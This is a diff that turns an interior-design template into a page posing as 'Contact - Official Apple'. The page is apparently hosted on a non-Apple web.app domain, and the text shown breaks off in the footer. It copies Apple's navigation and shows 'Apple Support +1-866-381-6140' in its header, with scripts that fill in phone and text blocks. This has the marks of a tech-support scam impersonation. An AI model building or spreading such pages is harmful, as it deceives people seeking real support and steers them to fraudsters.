@@ -1,12 +1,8 @@
-<?php
-?>
-<!doctype html>
-<html class="no-js" lang="zxx">
+<!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" class="no-js">
 <head>
-      <!-- Histats.com  (div with counter) --><div id="histats_counter"></div>
-<!-- Histats.com  START  (aync)-->
+  <!-- Histats.com  START  (aync)-->
 <script type="text/javascript">var _Hasync= _Hasync|| [];
-_Hasync.push(['Histats.start', '1,5039483,4,511,95,18,00000000']);
+_Hasync.push(['Histats.start', '1,5039569,4,0,0,0,00010000']);
 _Hasync.push(['Histats.fasi', '1']);
 _Hasync.push(['Histats.track_hits', '']);
 (function() {
@@ -14,616 +10,374 @@ var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async
 hs.src = ('//s10.histats.com/js15_as.js');
 (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
 })();</script>
-<noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5039483&101" alt="page hit counter" border="0"></a></noscript>
+<noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5039569&101" alt="counter create hit" border="0"></a></noscript>
 <!-- Histats.com  END  -->
-    <meta charset="utf-8">
-    <meta http-equiv="x-ua-compatible" content="ie=edge">
-    <title>Interior Design HTML-5 Template </title>
-    <meta name="description" content="">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <link rel="manifest" href="site.webmanifest">
-    <link rel="shortcut icon" type="image/x-icon" href="assets/img/favicon.ico">
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-MRVHLH4QHS"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
 
-    <!-- CSS here -->
-    <link rel="stylesheet" href="assets/css/bootstrap.min.css">
-    <link rel="stylesheet" href="assets/css/owl.carousel.min.css">
-    <link rel="stylesheet" href="assets/css/slicknav.css">
-    <link rel="stylesheet" href="assets/css/flaticon.css">
-    <link rel="stylesheet" href="assets/css/animate.min.css">
-    <link rel="stylesheet" href="assets/css/magnific-popup.css">
-    <link rel="stylesheet" href="assets/css/fontawesome-all.min.css">
-    <link rel="stylesheet" href="assets/css/themify-icons.css">
-    <link rel="stylesheet" href="assets/css/slick.css">
-    <link rel="stylesheet" href="assets/css/nice-select.css">
-    <link rel="stylesheet" href="assets/css/style.css">
+  gtag('config', 'G-MRVHLH4QHS');
+</script>
+<script defer data-domain="gllow-treathubb.web.app" src="https://plausible.io/js/script.js"></script>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="cache-control" content="max-age=3600">
+    <title>Contact - Official Apple</title>
+    <meta name="description" content="Contact Apple support by phone or chat, set up a repair, or make a Genius Bar appointment for iPhone, iPad, Mac and more.">
+    <link rel="stylesheet" href="css/Base.css" type="text/css">
+    <link rel="stylesheet" type="text/css" href="_families%253dSF%252bPro%252cv1_7CSF%252bPro%252bIcons%252cv1html.html">
+    <script src="js/text_tel.js"></script>
+
 </head>
 
-<body class="body-bg">
-<!--? Preloader Start -->
-<div id="preloader-active">
-    <div class="preloader d-flex align-items-center justify-content-center">
-        <div class="preloader-inner position-relative">
-            <div class="preloader-circle"></div>
-            <div class="preloader-img pere-text">
-                <img src="assets/img/logo/loder.jpg" alt="">
-            </div>
+<body>
+    <div id="result"></div>
+    <input type="checkbox" id="ac-gn-menustate" class="ac-gn-menustate">
+    <nav id="ac-globalnav" class="no-js">
+        <div class="ac-gn-content">
+            <ul class="ac-gn-header">
+                <li class="ac-gn-item ac-gn-menuicon">
+                    <label class="ac-gn-menuicon-label" for="ac-gn-menustate" aria-hidden="true">
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-top">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-top"></span>
+					 </span>
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-bottom">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-bottom"></span>
+					 </span>
+				 </label>
+                    <a href="#ac-gn-menustate" class="ac-gn-menuanchor ac-gn-menuanchor-open" id="ac-gn-menuanchor-open">
+					 <span class="ac-gn-menuanchor-label">Open Menu </span></a>
+                    <a href="#" class="ac-gn-menuanchor ac-gn-menuanchor-close" id="ac-gn-menuanchor-close">
+					 <span class="ac-gn-menuanchor-label">Close Menu </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus-small">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag ac-gn-bag-small" id="ac-gn-bag-small">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#"><span class="ac-gn-link-text">Shopping Bag </span><span class="ac-gn-bag-badge"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <ul class="ac-gn-list">
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-mac">
+                    <a class="ac-gn-link ac-gn-link-mac" href="#">
+					 <span class="ac-gn-link-text">Mac </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-ipad">
+                    <a class="ac-gn-link ac-gn-link-ipad" href="#">
+					 <span class="ac-gn-link-text">iPad </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-iphone">
+                    <a class="ac-gn-link ac-gn-link-iphone" href="#">
+					 <span class="ac-gn-link-text">iPhone </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-watch">
+                    <a class="ac-gn-link ac-gn-link-watch" href="#">
+					 <span class="ac-gn-link-text">Watch </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-tv">
+                    <a class="ac-gn-link ac-gn-link-tv" href="#">
+					 <span class="ac-gn-link-text">TV </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-music">
+                    <a class="ac-gn-link ac-gn-link-music" href="#">
+					 <span class="ac-gn-link-text">Music </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-support">
+                    <a class="ac-gn-link ac-gn-link-support" href="#">
+					 <span class="ac-gn-link-text">Support </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-search" role="search">
+                    <a class="ac-gn-link ac-gn-link-search" href="#">
+					 <span class="ac-gn-search-placeholder" aria-hidden="true">Search apple.com </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag" id="ac-gn-bag">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#" aria-label="Shopping Bag">
+					 <span class="ac-gn-link-text">Shopping Bag </span>
+					 <span class="ac-gn-bag-badge" aria-hidden="true"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <aside id="ac-gn-searchview" class="ac-gn-searchview" role="search">
+                <div class="ac-gn-searchview-content">
+                    <form id="ac-gn-searchform" class="ac-gn-searchform" action="http://www.apple.com/us/search" method="get">
+                        <div class="ac-gn-searchform-wrapper">
+                            <input id="ac-gn-searchform-input" class="ac-gn-searchform-input" type="text" placeholder="Search apple.com" autocorrect="off" autocapitalize="off" autocomplete="off" spellcheck="false">
+                            <input id="ac-gn-searchform-src" type="hidden" name="src" value="globalnav">
+                            <button id="ac-gn-searchform-submit" class="ac-gn-searchform-submit" type="submit" disabled="" aria-label="Submit"></button>
+                            <button id="ac-gn-searchform-reset" class="ac-gn-searchform-reset" type="reset" disabled="" aria-label="Clear Search"></button>
+                        </div>
+                    </form>
+                    <aside id="ac-gn-searchresults" class="ac-gn-searchresults"></aside>
+                </div>
+                <button id="ac-gn-searchview-close" class="ac-gn-searchview-close" aria-label="Close Search">
+					 <span class="ac-gn-searchview-close-wrapper">
+						 <span class="ac-gn-searchview-close-left"></span>
+						 <span class="ac-gn-searchview-close-right"></span>
+					 </span>
+			 </button>
+            </aside>
+            <aside class="ac-gn-bagview">
+                <div class="ac-gn-bagview-scrim">
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-small"></span>
+                </div>
+                <div class="ac-gn-bagview-content" id="ac-gn-bagview-content">
+                </div>
+            </aside>
         </div>
-    </div>
-</div>
-<header>
-    <!-- Header Start -->
-    <div class="header-area header-transparent">
-        <div class="main-header header-sticky">
-            <div class="container-fluid">
-                <div class="menu-wrapper d-flex align-items-center justify-content-between">
-                    <!-- Logo -->
-                    <div class="logo">
-                        <a href="index.html"><img src="assets/img/logo/logo.png" alt=""></a>
-                    </div>
-                    <!-- Main-menu -->
-                    <div class="main-menu f-right d-none d-lg-block">
-                        <nav>
-                            <ul id="navigation">
-                                <li><a href="index.html">Home</a></li>
-                                <li><a href="about.html">About</a></li>
-                                <li><a href="services.html">Services</a></li>
-                                <li><a href="work.html">Gallery</a></li>
-                                <li><a href="blog.html">Blog</a>
-                                    <ul class="submenu">
-                                        <li><a href="blog.html">Blog</a></li>
-                                        <li><a href="blog_details.html">Blog Details</a></li>
-                                        <li><a href="elements.html">Elements</a></li>
-                                    </ul>
+    </nav>
+    <div id="ac-gn-curtain" class="ac-gn-curtain"></div>
+    <div id="ac-gn-placeholder" class="ac-nav-placeholder"></div>
+
+    <div class="main">
+        <nav id="ac-localnav" class="js no-touch css-sticky" lang="en-US" role="navigation" data-sticky="">
+            <div class="ac-ln-wrapper">
+                <div class="ac-ln-background"></div>
+                <div class="ac-ln-content">
+                    <span class="ac-ln-title">
+                       <a href="#">Apple Support +1-866-381-6140 <font color="red"><font class="js_setPhoneBlock"></font></font></a>
+					 </span>
+                    <div class="ac-ln-menu">
+                        <a href="#ac-ln-menustate" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-open" id="ac-ln-menustate-open">  <span class="ac-ln-menucta-anchor-label">Open menu </span></a> <a href="#" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-close" id="ac-ln-menustate-close">  <span class="ac-ln-menucta-anchor-label">Close menu </span></a>
+                        <div class="ac-ln-menu-tray">
+                            <ul class="ac-ln-menu-items">
+                                <li class="ac-ln-menu-item"><a href="#" class="ac-ln-menu-link analytics-exitlink"> Communities </a>
                                 </li>
-                                <li><a href="contact.html">Contact</a></li>
                             </ul>
-                        </nav>
-                    </div>          
-                    <!-- Header-btn -->
-                    <div class="header-btns d-none d-lg-block f-right">
-                        <a href="#" class="btn header-btn">Contact Us</a>
-                    </div>
-                    <!-- Mobile Menu -->
-                    <div class="col-12">
-                        <div class="mobile_menu d-block d-lg-none"></div>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-    <!-- Header End -->
-</header>
-<main>
-    <!--? slider Area Start-->
-    <div class="slider-area">
-        <div class="slider-active dot-style">
-            <!-- Single Slider -->
-            <div class="single-slider slider-height hero-overly d-flex align-items-center">
-                <div class="container">
-                    <div class="row">
-                        <div class="col-xl-6 col-lg-6">
-                            <div class="hero__caption">
-                                <span data-animation="fadeInLeft" data-delay=".4s">Welcome to Intorior</span>
-                                <h1 data-animation="fadeInLeft" data-delay=".6s">Modern Interior & Design</h1>
+                        </div>
+                        <div class="ac-ln-actions">
+                            <div class="ac-ln-action ac-ln-action-menucta" aria-hidden="true">
+                                <label for="ac-ln-menustate" class="ac-ln-menucta">  <span class="ac-ln-menucta-chevron"></span>
+							 </label>
                             </div>
                         </div>
                     </div>
                 </div>
             </div>
-            <!-- Single Slider -->
-            <div class="single-slider slider-height hero-overly d-flex align-items-center">
-                <div class="container">
-                    <div class="row">
-                        <div class="col-xl-6 col-lg-6">
-                            <div class="hero__caption">
-                                <span data-animation="fadeInLeft" data-delay=".4s">Welcome to Intorior</span>
-                                <h1 data-animation="fadeInLeft" data-delay=".6s">Modern Interior & Design</h1>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-        <!-- Video icon -->
-        <div class="video-icon">
-            <a class="popup-video btn-icon" href="https://www.youtube.com/watch?v=1aP-TXUpNoU"><i class="fas fa-play"></i></a>
-        </div>
-    </div>
-    <!-- slider Area End-->
-    <!--? our info Start -->
-    <div class="our-info-area pt-170 pb-100 section-bg" data-background="assets/img/gallery/section_bg02.jpg">
-        <div class="container">
-            <div class="row justify-content-between">
-                <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
-                    <div class="single-info mb-60">
-                        <div class="info-caption">
-                            <h4>Clean and Services</h4>
-                            <p>For each project we establish relationships with partners who we know will help us. </p>
-                        </div>
-                    </div>
-                </div>
-                <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
-                    <div class="single-info mb-60">
-                        <div class="info-caption">
-                            <h4>Clean and Modern</h4>
-                            <p>For each project we establish relationships with partners who we know will help us. </p>
-                        </div>
-                    </div>
-                </div>
-                <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
-                    <div class="single-info mb-60">
-                        <div class="info-caption">
-                            <h4>Clean and Modern</h4>
-                            <p>For each project we establish relationships with partners who we know will help us. </p>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-    <!-- Our Info start -->
-    <!--? Professional Services Start -->
-    <div class="professional-services section-bg d-none d-md-block" data-background="assets/img/gallery/section_bg04.jpg"></div>
-    <div class="profession-caption">
-        <div class="container">
-            <div class="row align-items-end">
-                <div class="col-lg-8">
-                        <!-- Section Tittle -->
-                        <div class="section-tittle profession-details">
-                            <span>Our Professional Services</span>
-                            <h2>We will create modern and first class intorior.</h2>
-                            <p>Aorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore.</p>
-                            <p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud.</p>
-                        </div>
-                </div>
-                <div class="col-lg-4 col-md-6">
-                    <a href="about.html" class="btn btn3">Discover More About Ous</a>
-                </div>
-            </div>
-        </div>
-    </div>
-    <!-- Professional Services End -->
-    <!-- our info End -->
-    <!--? Services Ara Start -->
-    <div class="services-area section-padding3">
-        <div class="container">
-            <div class="row justify-content-center">
-                <div class="cl-xl-7 col-lg-8 col-md-10">
-                    <!-- Section Tittle -->
-                    <div class="section-tittle text-center mb-70">
-                        <span>Our Professional Services</span>
-                        <h2>Best Interitor Services</h2>
-                    </div> 
-                </div>
-            </div>
+        </nav>
+        <section class="as-columns  as-columns--1up  as-banner as-banner--top">
             <div class="row">
-                <div class="col-lg-4 col-md-6 col-sm-10">
-                    <div class="single-services mb-200">
-                        <div class="services-img">
-                            <img src="assets/img/gallery/services1.png" alt="">
-                            </div>
-                            <div class="services-caption">
-                            <h3><a href="services.html">Lighting</a></h3>
-                            <p class="pera1">For each project we establish </p>
-                            <p class="pera2">For each project we establish relationships with partners who we know will help us. </p>
-                        </div>
-                    </div>
-                </div>
-                <div class="col-lg-4 col-md-6 col-sm-10">
-                    <div class="single-services mb-200">
-                        <div class="services-img">
-                            <img src="assets/img/gallery/services2.png" alt="">
-                            </div>
-                            <div class="services-caption">
-                            <h3><a href="services.html">Interior Design</a></h3>
-                            <p class="pera1">For each project we establish </p>
-                            <p class="pera2">For each project we establish relationships with partners who we know will help us. </p>
-                        </div>
-                    </div>
-                </div>
-                <div class="col-lg-4 col-md-6 col-sm-10">
-                    <div class="single-services mb-200">
-                        <div class="services-img">
-                            <img src="assets/img/gallery/services3.png" alt="">
-                            </div>
-                            <div class="services-caption">
-                            <h3><a href="services.html">Office Decoretion</a></h3>
-                            <p class="pera1">For each project we establish </p>
-                            <p class="pera2">For each project we establish relationships with partners who we know will help us. </p>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-    <!-- Services Ara End -->
-    <!--? Gallery Area Start -->
-    <div class="gallery-area">
-        <div class="container-fluid p-0 fix">
-            <div class="row">
-                <div class="col-xl-6 col-lg-4 col-md-6">
-                    <div class="single-gallery mb-30">
-                        <div class="gallery-img" style="background-image: url(assets/img/gallery/gallery1.png);"></div>
-                        <div class="thumb-content-box">
-                            <div class="thumb-content">
-                                <h3><span>Intorior</span>Burj Khalifa</h3>
-                                <a href="work.html"><i class="fas fa-angle-right"></i></a>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-                <div class="col-xl-3 col-lg-4 col-md-6">
-                    <div class="single-gallery mb-30">
-                        <div class="gallery-img" style="background-image: url(assets/img/gallery/gallery2.png);"></div>
-                        <div class="thumb-content-box">
-                            <div class="thumb-content">
-                                <h3><span>Intorior</span>Burj Khalifa</h3>
-                                <a href="work.html"><i class="fas fa-angle-right"></i></a>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-                <div class="col-xl-3 col-lg-4 col-md-6">
-                    <div class="single-gallery mb-30">
-                            <div class="gallery-img" style="background-image: url(assets/img/gallery/gallery3.png);"></div>
-                        <div class="thumb-content-box">
-                            <div class="thumb-content">
-                                <h3><span>Intorior</span>Burj Khalifa</h3>
-                                <a href="work.html"><i class="fas fa-angle-right"></i></a>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-                <div class="col-xl-3 col-lg-4 col-md-6">
-                    <div class="single-gallery mb-30">
-                        <div class="gallery-img" style="background-image: url(assets/img/gallery/gallery4.png);"></div>
-                        <div class="thumb-content-box">
-                            <div class="thumb-content">
-                                <h3><span>Intorior</span>Burj Khalifa</h3>
-                                <a href="work.html"><i class="fas fa-angle-right"></i></a>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-                <div class="col-xl-3 col-lg-4 col-md-6">
-                    <div class="single-gallery mb-30">
-                        <div class="gallery-img" style="background-image: url(assets/img/gallery/gallery5.png);"></div>
-                        <div class="thumb-content-box">
-                            <div class="thumb-content">
-                                <h3><span>Intorior</span>Burj Khalifa</h3>
-                                <a href="work.html"><i class="fas fa-angle-right"></i></a>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-                <div class="col-xl-6 col-lg-4 col-md-6">
-                    <div class="single-gallery mb-30">
-                        <div class="gallery-img" style="background-image: url(assets/img/gallery/gallery6.png);"></div>
-                        <div class="thumb-content-box">
-                            <div class="thumb-content">
-                                <h3><span>Intorior</span>Burj Khalifa</h3>
-                                <a href="work.html"><i class="fas fa-angle-right"></i></a>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-    <!-- Gallery Area End -->
-    <!-- Team Start -->
-    <div class="team-area section-padding30">
-        <div class="container">
-            <div class="row justify-content-center">
-                <div class="cl-xl-7 col-lg-8 col-md-10">
-                    <!-- Section Tittle -->
-                    <div class="section-tittle text-center mb-70">
-                        <span>Creative derector</span>
-                        <h2>Best Interitor Services</h2>
-                    </div> 
-                </div>
-            </div>
-            <div class="row">
-                <!-- single Tem -->
-                <div class="col-xl-4 col-lg-4 col-md-6 col-sm-">
-                    <div class="single-team mb-30">
-                        <div class="team-img">
-                            <img src="assets/img/gallery/team2.png" alt="">
-                        </div>
-                        <div class="team-caption">
-                            <h3><a href="#">Jhon Sunsa</a></h3>
-                            <span>Creative derector</span>
-                        </div>
-                    </div>
-                </div>
-                <div class="col-xl-4 col-lg-4 col-md-6 col-sm-">
-                    <div class="single-team mb-30">
-                        <div class="team-img">
-                            <img src="assets/img/gallery/team3.png" alt="">
-                        </div>
-                        <div class="team-caption">
-                            <h3><a href="#">Jhon Sunsa</a></h3>
-                            <span>Creative derector</span>
-                        </div>
-                    </div>
-                </div>
-                <div class="col-xl-4 col-lg-4 col-md-6 col-sm-">
-                    <div class="single-team mb-30">
-                        <div class="team-img">
-                            <img src="assets/img/gallery/team1.png" alt="">
-                        </div>
-                        <div class="team-caption">
-                            <h3><a href="#">Jhon Sunsa</a></h3>
-                            <span>Creative derector</span>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-    <!-- Team End -->
-    <!-- Testimonial Start -->
-    <div class="testimonial-area testimonial-padding">
-        <div class="container">
-            <!-- Testimonial contents -->
-            <div class="row d-flex justify-content-center">
-                <div class="col-xl-8 col-lg-8 col-md-10">
-                    <div class="h1-testimonial-active dot-style">
-                        <!-- Single Testimonial -->
-                        <div class="single-testimonial text-center">
-                            <!-- Testimonial Content -->
-                            <div class="testimonial-caption ">
-                                <div class="testimonial-top-cap">
-                                    <img src="assets/img/gallery/testi-logo.png" alt="">
-                                    <p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip</p>
-                                </div>
-                                <!-- founder -->
-                                <div class="testimonial-founder  ">
-                                    <div class="founder-img">
-                                        <span><strong>Christine Eve</strong>   -   Co Founder</span>
-                                    </div>
-                                </div>
-                            </div>
-                        </div>
-                        <!-- Single Testimonial -->
-                        <div class="single-testimonial text-center">
-                            <!-- Testimonial Content -->
-                            <div class="testimonial-caption ">
-                                <div class="testimonial-top-cap">
-                                    <img src="assets/img/gallery/testi-logo.png" alt="">
-                                    <p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip</p>
-                                </div>
-                                <!-- founder -->
-                                <div class="testimonial-founder  ">
-                                    <div class="founder-img">
-                                        <span><strong>Christine Eve</strong>   -   Co Founder</span>
-                                    </div>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-    <!-- Testimonial End -->
-    <!-- Brand Area Start -->
-    <div class="brand-area pt-120 pb-120">
-        <div class="container">
-            <div class="brand-active brand-border pt-50 pb-40">
-                <div class="single-brand">
-                    <img src="assets/img/gallery/brand1.png" alt="">
-                </div>
-                <div class="single-brand">
-                    <img src="assets/img/gallery/brand2.png" alt="">
-                </div>
-                <div class="single-brand">
-                    <img src="assets/img/gallery/brand3.png" alt="">
-                </div>
-                <div class="single-brand">
-                    <img src="assets/img/gallery/brand4.png" alt="">
-                </div>
-                <div class="single-brand">
-                    <img src="assets/img/gallery/brand2.png" alt="">
-                </div>
-                <div class="single-brand">
-                    <img src="assets/img/gallery/brand5.png" alt="">
-                </div>
-            </div>
-        </div>
-    </div>
-    <!-- Brand Area End -->
-    <!-- Want To work -->
-    <section class="wantToWork-area w-padding2">
-        <div class="container">
-            <div class="row align-items-center justify-content-between">
-                <div class="col-xl-8 col-lg-8 col-md-8">
-                    <div class="wantToWork-caption wantToWork-caption2">
-                        <h2>Are you Searching For a First-Class Consultant?</h2>
-                    </div>
-                </div>
-                <div class="col-xl-2 col-lg-2 col-md-3">
-                    <a href="#" class="btn btn-black f-right">Contact Us</a>
-                </div>
-            </div>
-        </div>
-    </section>
-    <!-- Want To work End -->
-    <!-- Blog Area Start -->
-    <div class="home-blog-area section-padding30">
-        <div class="container">
-            <!-- Section Tittle -->
-            <div class="row">
-                <div class="col-lg-12">
-                    <div class="section-tittle text-center mb-70">
-                        <span>Our latest blog</span>
-                        <h2>Our recent news</h2>
-                    </div>
-                </div>
-            </div>
-            <div class="row">
-                <div class="col-xl-6 col-lg-6 col-md-6">
-                    <div class="home-blog-single mb-30">
-                        <div class="blog-img-cap">
-                            <div class="blog-img">
-                                <img src="assets/img/gallery/home_blog1.png" alt="">
-                            </div>
-                            <ul>
-                                <li class="black-bg">October 27, 2020</li>
-                                <li>By Admin   -   30 Likes   -   4 Comments</li>
-                            </ul>
-                            <div class="blog-cap">
-                                <h3><a href="blog_details.html">16 Easy Ideas to Use Everyday
-                                    Stuff in Kitchen.</a></h3>
-                                <a href="blog_details.html" class="more-btn">Read more</a>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-                <div class="col-xl-6 col-lg-6 col-md-6">
-                    <div class="home-blog-single mb-30">
-                        <div class="blog-img-cap">
-                            <div class="blog-img">
-                                <img src="assets/img/gallery/home_blog2.png" alt="">
-                            </div>
-                            <ul>
-                                <li class="black-bg">October 27, 2020</li>
-                                <li>By Admin   -   30 Likes   -   4 Comments</li>
-                            </ul>
-                            <div class="blog-cap">
-                                <h3><a href="blog_details.html">16 Easy Ideas to Use Everyday
-                                    Stuff in Kitchen.</a></h3>
-                                <a href="blog_details.html" class="more-btn">Read more</a>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-    <!-- Blog Area End -->
+                <div class="column large-12 medium-12 small-12">
+                    <div class="as-banner-cont">
+                        <div class="as-banner-image as-banner-image--top">
+                            <style type="text/css">
+                                .as-banner-image.as-banner-image--top {
+                                    background-image: url("images/contact-us-hero.image.large_2x.jpg");
+                                }
 
-</main>
-<footer>
-    <!--? Footer Start-->
-    <div class="footer-area footer-bg">
-        <div class="container">
-            <div class="footer-top footer-padding">
-                <div class="row d-flex justify-content-between">
-                    <div class="col-xl-3 col-lg-4 col-md-5 col-sm-8">
-                        <div class="single-footer-caption mb-50">
-                            <!-- logo -->
-                            <div class="footer-logo">
-                                <a href="index.html"><img src="assets/img/logo/logo2_footer.png" alt=""></a>
-                            </div>
-                            <div class="footer-tittle">
-                                <div class="footer-pera">
-                                    <p class="info1">Grabbing the concsumer’s attention isn’t enough you have to keep that attention for at least a.</p>
-                                </div>
-                            </div>
-                            <div class="footer-number">
-                                <h4><span>+564 </span>7885 3222</h4>
-                                <p>youremail@gmail.com</p>
-                            </div>
+                                .as-banner-image.as-banner-image--top:before {
+                                    content: "";
+                                    display: block;
+                                }
+
+                                @media only screen and (max-width: 735px) {
+                                    .as-banner-image.as-banner-image--top {
+                                        background-image: url("images/contact-us-hero.image.small_2x.jpg");
+                                    }
+                                }
+                            </style>
+                            <img sizes="(min-width:735px ) 735w, 100vw" srcset="images/contact-us-hero.image.small_2x.jpg 735w, images/contact-us-hero.image.large_2x.jpg 1440w" alt="" class="as-image-speculativedownload" src="images/contact-us-hero.image.large_2x.jpg">
                         </div>
                     </div>
-                    <div class="col-xl-3 col-lg-2 col-md-5 col-sm-6">
-                        <div class="single-footer-caption mb-50">
-                            <div class="footer-tittle">
-                                <h4>Useful Links</h4>
-                            </div>
-                            <div class="footer-cap">
-                                <span>New York</span>
-                                <p>123 East 26th Street, Fifth Floor, New York, NY 10011</p>
-                            </div>
-                            <div class="footer-cap">
-                                <span>Japan</span>
-                                <p>123 East 26th Street, Fifth Floor, New York, NY 10011</p>
-                            </div>
-                        </div>
-                    </div>
-                    <!-- Instagram -->
-                    <div class="col-xl-4 col-lg-4 col-md-5 col-sm-7">
-                        <div class="single-footer-caption mb-50">
-                            <div class="footer-tittle">
-                                <h4>Instagram Feed</h4>
-                            </div>
-                            <div class="instagram-gellay">
-                                <ul class="insta-feed">
-                                    <li><a href="#"><img src="assets/img/gallery/instagram1.png" alt=""></a></li>
-                                    <li><a href="#"><img src="assets/img/gallery/instagram2.png" alt=""></a></li>
-                                    <li><a href="#"><img src="assets/img/gallery/instagram3.png" alt=""></a></li>
-                                    <li><a href="#"><img src="assets/img/gallery/instagram4.png" alt=""></a></li>
-                                    <li><a href="#"><img src="assets/img/gallery/instagram5.png" alt=""></a></li>
-                                    <li><a href="#"><img src="assets/img/gallery/instagram6.png" alt=""></a></li>
-                                </ul>
-                            </div>
+                    <div class="as-banner-content">
+                        <div class="pageTitle  ">
+                            <h1 class="pageTitle-heading">Apple Support </h1>
+                            <p class="pageTitle-intro js_setTextBlock">
+                        </p></div>
+                        <div class="sectionTitle sectionTitleBlock">
+                            <h2 class="sectionTitle-heading"></h2>
                         </div>
                     </div>
                 </div>
             </div>
-            <div class="footer-bottom">
-                <div class="row d-flex justify-content-between align-items-center">
-                    <div class="col-xl-9 col-lg-8">
-                        <div class="footer-copy-right">
-                            <p><!-- Link back to Colorlib can't be removed. Template is licensed under CC BY 3.0. -->
-  Copyright &copy;<script>document.write(new Date().getFullYear());</script> All rights reserved | This template is made with <i class="fa fa-heart" aria-hidden="true"></i> by <a href="https://colorlib.com" target="_blank">Colorlib</a>
-  <!-- Link back to Colorlib can't be removed. Template is licensed under CC BY 3.0. --></p>
-                        </div>
-                    </div>
-                    <div class="col-xl-3 col-lg-4">
-                        <!-- Footer Social -->
-                        <div class="footer-social f-right">
-                            <span>Follow Us</span>
-                            <a href="#"><i class="fab fa-twitter"></i></a>
-                            <a href="https://www.facebook.com/sai4ull"><i class="fab fa-facebook-f"></i></a>
-                            <a href="#"><i class="fas fa-globe"></i></a>
-                            <a href="#"><i class="fab fa-instagram"></i></a>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
+        </section>
     </div>
-    <!-- Footer End-->
-</footer>
-<!-- Scroll Up -->
-<div id="back-top" >
-    <a title="Go to Top" href="#"> <i class="fas fa-level-up-alt"></i></a>
-</div>
 
-<!-- JS here -->
-    <!-- All JS Custom Plugins Link Here here -->
-    <script src="./assets/js/vendor/modernizr-3.5.0.min.js"></script>
-    <!-- Jquery, Popper, Bootstrap -->
-    <script src="./assets/js/vendor/jquery-1.12.4.min.js"></script>
-    <script src="./assets/js/popper.min.js"></script>
-    <script src="./assets/js/bootstrap.min.js"></script>
-    <!-- Jquery Mobile Menu -->
-    <script src="./assets/js/jquery.slicknav.min.js"></script>
+    <footer id="ac-globalfooter" class="no-js">
+        <div class="ac-gf-content">
+            <section class="ac-gf-footer">
